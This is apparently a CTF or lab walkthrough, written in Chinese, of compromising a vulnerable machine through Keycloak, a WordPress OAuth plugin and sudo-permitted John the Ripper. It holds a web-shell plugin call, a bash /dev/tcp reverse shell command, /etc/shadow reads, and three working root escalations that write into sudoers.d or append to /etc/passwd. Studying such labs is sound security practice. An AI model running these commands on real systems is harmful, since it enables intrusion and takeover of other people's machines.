# 信息收集

```bash
IP=192.168.205.179
nmap -p0-65535 $IP
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

三个端口，22 是 SSH，80 是 Apache，8080 一看就是 Java 应用。先绑域名，因为访问 IP 会 301 到 `oauth.dsz`。

```bash
echo "$IP oauth.dsz" | sudo tee -a /etc/hosts
```

80 端口是个 WordPress 站点，版本 6.9.4，主题 twentytwentyfive。页面内容全在讲 OAuth 协议，文章、标签、分类全是 OAuth 相关的科普。装了个 OAuth 插件 `miniorange-login-with-eve-online-google-facebook`，登录页面有个 OAuth 按钮。

站点标语（Tagline）写着 `Admin@123`，这种位置放密码的操作还是头一回见。先记下来。

8080 端口是 Keycloak 管理后台，访问 `/admin/master/console/` 能看到登录界面。

# Keycloak 到 WordPress

用 `admin:Admin@123` 登录 Keycloak，直接进了管理后台。在菜单里面能看到一个 `wordpress-site` realm，这就是 WordPress OAuth 插件对接的认证源。

![image-20260605092553395](http://7r1UMPHK.github.io/image/20260605132333626.webp)

切到 `wordpress-site` realm，在 Users 里创建一个新用户（或者重置已有用户密码），Email Verified 设为 ON，密码的 Temporary 设为 OFF。

回到 WordPress 登录页 `http://oauth.dsz/wp-login.php`，点 OAuth 按钮，用刚才在 Keycloak 配置的用户认证，拿到 WordPress 管理员权限。

# WordPress GetShell

管理员后台，老套路，上传恶意插件。（自己找，github一堆，不提供了）

插件页面上传 `shell.zip`，激活，验证一下：

```bash
curl "http://oauth.dsz/wp-content/plugins/shell/shell.php?cmd=id"
```

```
uid=104(apache) gid=106(apache) groups=106(apache)
```

拿到 apache 用户的 RCE。开监听反弹 shell：

```bash
nc -lvnp 8888
```

```bash
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'" "http://oauth.dsz/wp-content/plugins/shell/shell.php"
```

收到 shell 后做个基本稳定化：

```bash
export TERM=xterm
export SHELL=/bin/bash
```

# 横向移动

看一下本地用户：

```bash
ls -al /home/
```

```
drwxr-sr-x    2 keycloak keycloak      4096 Apr  6 18:02 keycloak
drwxr-sr-x    3 wiktor   wiktor        4096 Apr  6 17:37 wiktor
```

两个用户，wiktor 和 keycloak。apache 用户啥 sudo 权限都没有，得先横向。

`su wiktor` 试了一下密码 `wiktor`，直接进去了。这个密码后来才知道是 john 破解 shadow 得出来的，当时纯猜的。

```bash
su wiktor
id
```

```
uid=1000(wiktor) gid=1000(wiktor) groups=1000(wiktor)
```

看 sudo 权限：

```bash
sudo -l
```

```
Runas and Command-specific defaults for wiktor:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User wiktor may run the following commands on Oauth:
    (root) NOPASSWD: /usr/bin/john
```

可以 root 身份跑 john。先把 shadow 破了看看：

```bash
sudo /usr/bin/john /etc/shadow
```

```
wiktor           (wiktor)
;tib'[d;         (keycloak)
```

root 的密码没破出来，字典跑完了都没中。wiktor 密码就是 `wiktor`，keycloak 的密码 `;tib'[d;` 看着像乱码，实际上是键盘上某个单词每个键右移两位产生的，挺有意思的彩蛋。

切到 keycloak 拿 user flag：

```bash
su keycloak
cat /home/keycloak/uuuussseer.txt
```

```
flag{user-1fd5df65f42de9599a29f873cf7c6fa6}
```

keycloak 的 sudo 权限是 `(wiktor) NOPASSWD: /usr/bin/scp`，对提权没什么直接帮助。

# 提权

回到 wiktor 用户，核心就是利用 `sudo /usr/bin/john`。root 密码破不出来，得想办法用 john 的功能来写文件。

john 以 root 身份运行，它创建的所有文件都是 root 属主。能写文件的参数主要有三个：`--session` 写 `.rec` 恢复文件、`--pot` 写破解结果、以及 `--wordlist` 读任意文件配合 `--stdout` 输出。

## 读取任意文件（未成功获取 root flag）

john 的 `--wordlist` 以 root 权限读文件，`--stdout` 直接输出内容，相当于一个 root 权限的 `cat`：

```bash
sudo /usr/bin/john --wordlist=/etc/shadow --stdout
sudo /usr/bin/john --wordlist=/root/.bash_history --stdout
```

我试着猜 root flag 的文件名，user flag 文件叫 `uuuussseer.txt`（字母重复递减），所以 root 应该也是类似的变种。跑了个循环遍历各种组合：

```bash
for r in r rr rrr rrrr rrrrr; do for o in o oo ooo oooo ooooo; do for t in t tt ttt tttt ttttt; do f="${r}${o}${t}.txt"; result=$(sudo /usr/bin/john --wordlist=/root/$f --stdout 2>&1); if ! echo "$result" | grep -q "No such file"; then echo "FOUND: /root/$f"; echo "$result"; break 3; fi; done; done; done
```

全都是 `No such file or directory`，文件名不是这种简单变种。这条路走不通，还是得拿 root shell。

## 方法一：--session 符号链接写 sudoers（by Sublarge）

john 的 `--session=NAME` 会创建 `NAME.rec` 文件保存会话恢复数据。`.rec` 文件内容里会记录命令行里传入的密码文件路径。如果把密码文件的文件名设成一条合法的 sudoers 规则，然后用符号链接把 `.rec` 指向 `/etc/sudoers.d/` 下的文件，john 以 root 写入时就会通过符号链接把内容写进 sudoers.d。

虽然 `.rec` 里大部分内容是会话元数据，sudoers 解析时会报一堆 syntax error，但 sudoers 的行为是逐行解析，遇到合法行就生效，不会因为其他行有错就整个文件失效。

有个关键的坑：不能在 `/tmp` 下操作。`/tmp` 有 sticky bit（`drwxrwxrwt`），wiktor 创建的符号链接，root 的 john 进程无法通过它写入目标文件。必须在 `/home/wiktor` 下操作，这个目录属主是 wiktor，没有 sticky bit 限制。

```bash
cd /home/wiktor
```

创建一个 hash 文件，文件名本身就是 sudoers 规则：

```bash
HASH=$(openssl passwd -5 -salt test 'password')
echo "test:${HASH}:19000:0:99999:7:::" > 'ALL ALL=(ALL) NOPASSWD: ALL'
```

创建符号链接，让 `a.rec` 指向 `/etc/sudoers.d/a`：

```bash
ln -sf /etc/sudoers.d/a a.rec
```

以 root 身份运行 john，session 名对应符号链接的前缀：

```bash
sudo /usr/bin/john --session=a 'ALL ALL=(ALL) NOPASSWD: ALL'
```

john 开始跑之后按 `q` 中断。此时 `.rec` 已经通过符号链接写入了 `/etc/sudoers.d/a`。

验证：

```bash
sudo -l
```

输出里虽然有一堆 syntax error，但最后能看到：

```
User wiktor may run the following commands on Oauth:
    (root) NOPASSWD: /usr/bin/john
    (ALL) NOPASSWD: ALL
```

提权：

```bash
sudo su
```

## 方法二：--field-separator-char 换行符写 sudoers（by scdyh）

这个方法更优雅。john 的 `--help` 末尾有一句 `See also doc/ENCODINGS and --list=hidden-options`，执行 `--list=hidden-options` 能看到一个隐藏参数：

```
--field-separator-char=C   use 'C' instead of the ':' in input and pot files
```

john 的 pot 文件格式正常是 `hash:password`，用 `:` 分隔哈希和明文。如果把分隔符替换成换行符 `$'\n'`，输出就变成了两行：第一行是哈希（垃圾数据），第二行是明文密码（完全可控）。把 pot 文件指向 `/etc/sudoers.d/` 下的文件，明文密码设为合法 sudoers 规则，就实现了精确写入。

先生成一个已知密码的 hash。密码内容就是要写入的 sudoers 规则：

```bash
HASH=$(openssl passwd -6 -salt testsalt 'keycloak ALL=(ALL:ALL) NOPASSWD: ALL')
echo "$HASH" > /home/keycloak/h
```

创建 wordlist，内容也是这条 sudoers 规则：

```bash
echo 'keycloak ALL=(ALL:ALL) NOPASSWD: ALL' > /home/keycloak/w
```

用换行符作为字段分隔符，pot 写入 sudoers.d：

```bash
sudo /usr/bin/john --format=sha512crypt --wordlist=/home/keycloak/w --field-separator-char=$'\n' /home/keycloak/h --pot=/etc/sudoers.d/keycloak_pwn
```

pot 文件写入后内容是两行：第一行是 hash 字符串（sudoers 无法解析，报错跳过），第二行是 `keycloak ALL=(ALL:ALL) NOPASSWD: ALL`（合法规则，生效）。切到 keycloak 用户后直接 `sudo su`。

## 方法三：--pot 追加 /etc/passwd（by lnnn/菜叶片）

john 的 `--pot=FILE` 以 root 权限追加破解结果到指定文件。pot 格式是 `hash:password`，如果把 pot 指向 `/etc/passwd`，控制好内容就能追加一个 uid=0 的用户。

思路是：构造一个 MD5 hash，对应的明文是一段 passwd 格式的字符串（包含 uid=0）。pot 追加到 `/etc/passwd` 后，整行就变成了 `$dynamic_0$hash:password_hash:0:0:root:/root:`，刚好是一个合法的 passwd 条目。

先生成密码哈希：

```bash
openssl passwd -1 -salt yp "lol"
```

```
$1$yp$eeuzl56m97I4.QHhUWPXG1
```

构造 passwd 行的后半段并计算它的 MD5：

```bash
echo -n '$1$yp$eeuzl56m97I4.QHhUWPXG1:0:0:root:/root:' | md5sum
```

```
bb8005e24ff27e230065071ba1d3462b
```

创建 hash 文件：

```bash
echo 'bb8005e24ff27e230065071ba1d3462b' > hash
```

用 `--mask` 指定明文就是 passwd 行的后半段，pot 直接追加到 `/etc/passwd`：

```bash
sudo /usr/bin/john --pot=/etc/passwd --mask='$1$yp$eeuzl56m97I4.QHhUWPXG1:0:0:root:/root:' --format=raw-md5 hash
```

john 破解成功后往 `/etc/passwd` 追加了一行。用户名是 pot 格式中的 hash 前缀 `$dynamic_0$bb8005e24ff27e230065071ba1d3462b`，密码是 `$1$yp$eeuzl56m97I4.QHhUWPXG1`（对应明文 `lol`），uid 是 0。

```bash
su - '$dynamic_0$bb8005e24ff27e230065071ba1d3462b'
```

输入密码 `lol`：

```
root@Oauth:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Flag

```
flag{user-1fd5df65f42de9599a29f873cf7c6fa6}
flag{root-a00d5b7f3a0a1108dd975a1d0c3fc2fc}
```